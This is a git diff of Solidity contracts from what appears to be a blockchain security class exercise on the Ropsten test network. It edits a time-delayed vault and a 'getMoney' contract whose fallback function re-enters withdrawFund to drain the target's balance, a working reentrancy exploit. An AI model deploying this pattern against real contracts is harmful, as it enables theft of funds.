@@ -119,9 +119,9 @@ contract TimeDelayedVault is BasicMultiOwnerVault {
         //this.call(bytes4(sha3("initializeVault()")));
        
         // Please note, the following code chunk is different for each group, all group members are added to authorizedUsers array
-        authorizedUsers.push(0xca35b7d915458ef540ade6068dfe2f44e8fa733c); //second
-        authorizedUsers.push(0x14723a09acff6d2a60dcdf7aa4aff308fddc160c);//third
-
+        //authorizedUsers.push(0xca35b7d915458ef540ade6068dfe2f44e8fa733c); //second
+        //authorizedUsers.push(0x14723a09acff6d2a60dcdf7aa4aff308fddc160c);//third
+        authorizedUsers.push(0xeb557D1A1c81a18D435cd7c882f20D24ED6E9dd3); //metamask ropsten
 
         for(uint i=0; i<authorizedUsers.length; i++) {
             votes.push(false);
@@ -155,7 +155,7 @@ contract hackOthers {
 
 contract getMoney{
     //address ct_addr = 0xAEc6E567C38746cAeDCB55a5A007704E69e00c70;
-    address ct_addr = 0x5e72914535f202659083db3a02c984188fa26e9f;
+    address ct_addr = 0x692a70d2e424a56d2c6c27aa97d1a86395877b3a;
     uint count = 0;
     uint limit = 1;
     
@@ -164,17 +164,24 @@ contract getMoney{
        ct.setObserver(this);    
     }
     function hack(){ // need checkObserver first
+         count += 1;
          ct.withdrawFund(this);
     }
+    function hack2(){ // need checkObserver first
+         ct.setObserver(this);
+         count += 1;
+
+         ct.withdrawFund(this);
+    }    
     function () payable {
-        if(count<=limit ){
+        if(count<limit ){
             count += 1;
             ct.withdrawFund(this);
         }else{
             count = 0;
         }
     }
-    function theBalance () returns (uint){
+    function theBalance () returns (uint _balance){
         return this.balance;
     }
     function setLimit(uint _limit) returns (uint){
